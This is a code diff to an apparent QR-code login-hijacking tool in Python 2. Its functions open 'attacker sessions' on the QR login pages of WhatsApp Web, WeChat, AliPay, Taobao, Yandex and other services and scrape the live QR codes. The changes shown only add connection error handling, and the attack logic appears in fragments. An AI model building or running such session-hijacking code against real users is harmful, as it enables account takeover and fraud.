@@ -90,8 +90,13 @@ def whatsapp():
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get('https://web.whatsapp.com/')
-	time.sleep(5)
+	try:
+		driver.get('https://web.whatsapp.com/')
+		time.sleep(5)
+	except:
+		print " [!] Error Check your internet connection"
+		time.sleep(5)
+		return
 
 	while True:
 		try:
@@ -122,8 +127,14 @@ def Yandex():
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get("https://passport.yandex.com/auth?mode=qr")
-	time.sleep(5)
+	try:
+		driver.get("https://passport.yandex.com/auth?mode=qr")
+		time.sleep(5)
+	except:
+		print " [!] Error Check your internet connection"
+		time.sleep(5)
+		return
+
 	while True:
 		try:
 			img_url = "https://passport.yandex.com" + driver.find_element_by_class_name("qr-code__i").get_attribute("style").split("\"")[1].encode("utf-8")
@@ -136,8 +147,13 @@ def Yandex():
 			if "yandex.com" in driver.current_url.encode("utf-8"):
 			    if "mode=qr" not in driver.current_url.encode("utf-8"):
 					print " [*] Refreshing page..."
-					driver.get("https://passport.yandex.com/auth?mode=qr")
-					time.sleep(5)
+					try:
+						driver.get("https://passport.yandex.com/auth?mode=qr")
+						time.sleep(5)
+					except:
+						print " [!] Error Check your internet connection"
+						time.sleep(5)
+						return
 			continue
 		except:
 			break
@@ -146,8 +162,13 @@ def Airdroid():
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get("http://web.airdroid.com")
-	time.sleep(5)
+	try:
+		driver.get("http://web.airdroid.com")
+		time.sleep(5)
+	except:
+		print " [!] Error Check your internet connection"
+		time.sleep(5)
+		return
 	img_number = 16
 	refresh = 0
 	while True:
@@ -181,8 +202,13 @@ def Weibo():
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get("http://weibo.com/login.php")
-	time.sleep(5)
+	try:
+		driver.get("http://weibo.com/login.php")
+		time.sleep(5)
+	except:
+		print " [!] Error Check your internet connection"
+		time.sleep(5)
+		return
 	while True:
 
 		try:
@@ -204,8 +230,13 @@ def WeChat():
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get("https://web.wechat.com")
-	time.sleep(5)
+	try:
+		driver.get("https://web.wechat.com")
+		time.sleep(5)
+	except:
+		print " [*] Error Check your internet connection"
+		time.sleep(5)
+		return
 	while True:
 		try:
 			iclass = driver.find_element_by_class_name('qrcode')[0]
@@ -224,8 +255,13 @@ def AliPay():
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get("https://auth.alipay.com/login/index.htm")
-	time.sleep(10)
+	try:
+		driver.get("https://auth.alipay.com/login/index.htm")
+		time.sleep(5)
+	except:
+		print " [*] Error Check your internet connection"
+		time.sleep(5)
+		return
 	while True:
 
 		try:
@@ -257,8 +293,13 @@ def Taobao():
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get("https://login.taobao.com")
-	time.sleep(5)
+	try:
+		driver.get("https://login.taobao.com")
+		time.sleep(5)
+	except:
+		print " [*] Error Check your internet connection"
+		time.sleep(5)
+		return
 	while True:
 
 		try:
@@ -286,8 +327,13 @@ def mydigipass():
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get("https://www.mydigipass.com/en/fp/signin/smartphone/qr")
-	time.sleep(5)
+	try:
+		driver.get("https://www.mydigipass.com/en/fp/signin/smartphone/qr")
+		time.sleep(5)
+	except:
+		print " [!] Error Check your internet connection"
+		time.sleep(5)
+		return
 	while True:
 
 		try:
@@ -309,8 +355,13 @@ def Zapper():
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get("https://www.zapper.com/login.php")
-	time.sleep(5)
+	try:
+		driver.get("https://www.zapper.com/login.php")
+		time.sleep(5)
+	except:
+		print " [!] Error Check your internet connection"
+		time.sleep(5)
+		return
 	while True:
 		try:
 			img = driver.find_elements_by_tag_name("img")[3]
@@ -327,8 +378,13 @@ def Trustly_App():
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get("https://trustlyapp.com/backend")
-	time.sleep(5)
+	try:
+		driver.get("https://trustlyapp.com/backend")
+		time.sleep(5)
+	except:
+		print " [!] Error Check your internet connection"
+		time.sleep(5)
+		return
 	while True:
 
 		try:
@@ -348,8 +404,13 @@ def Yelophone():
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get("https://www.yelophone.com/app#/login")
-	time.sleep(5)
+	try:
+		driver.get("https://www.yelophone.com/app#/login")
+		time.sleep(5)
+	except:
+		print " [!] Error Check your internet connection"
+		time.sleep(5)
+		return
 	while True:
 
 		try:
@@ -580,7 +641,13 @@ def First_Method(classname,url,image_number,s=10):
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get(url)
+	try:
+		driver.get(url)
+		time.sleep(5)
+	except:
+		print " [!] Error Check your internet connection"
+		time.sleep(5)
+		return
 
 	while True:
 
@@ -603,8 +670,13 @@ def Second_Method(url,image_number,s=10):
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get(url)
-	time.sleep(5)
+	try:
+		driver.get(url)
+		time.sleep(5)
+	except:
+		print " [!] Error Check your internet connection"
+		time.sleep(5)
+		return
 	while True:
 
 		try:
@@ -626,8 +698,13 @@ def Third_Method(url,image_number,s=10):
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Starting attacker session..."
-	driver.get(url)
-	time.sleep(10)
+	try:
+		driver.get(url)
+		time.sleep(10)
+	except:
+		print " [!] Error Check your internet connection"
+		time.sleep(5)
+		return
 	while True:
 
 		try:
